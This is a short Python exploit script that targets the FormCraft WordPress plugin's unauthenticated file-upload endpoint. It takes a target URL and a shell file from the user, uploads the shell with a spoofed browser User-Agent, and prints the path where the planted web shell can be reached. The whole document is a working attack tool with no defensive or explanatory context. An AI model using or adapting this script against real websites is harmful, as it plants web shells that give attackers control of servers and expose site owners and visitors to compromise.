import requests
import sys
import re
import time

#tested True =  exploit work

url = input("[*] Enter Target url: ")
arquivo = input("[*] Enter Shell script: ")
print("[*] Target: ", url)
print("[*] Arquivo Shell: ", arquivo)
############################### EXECUTA EXPLOIT ###############################
payload = {"files[]": open(arquivo,'rb')}
bad = "ERROR" or "failed" or "Not allowed"
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"}
def main():
    target = url + "/wp-content/plugins/formcraft/file-upload/server/content/upload.php"
    path = url + "/wp-content/plugins/formcraft/file-upload/server/content/files/"
    req_up = requests.get(target)
    print("[*] Status code: ",req_up.status_code)
    if req_up.status_code != 404:
        print("[*] Sending shell..")
        s = requests.session()
        r = s.post(target, files=payload, headers=headers)
        if r.status_code == 200:
            if bad in r.text:
                print("[!] Access False")
            else:
                if arquivo in r.text:
                    print("[+] Exploit sucesso!\n")
                    txt = r.text
                    txt = txt.split('"')
                    path = path + txt[9]
                    print(path)
        else:
            print("[!] Faild Uploading shell")
    else:
        print("[-] Failed")
main()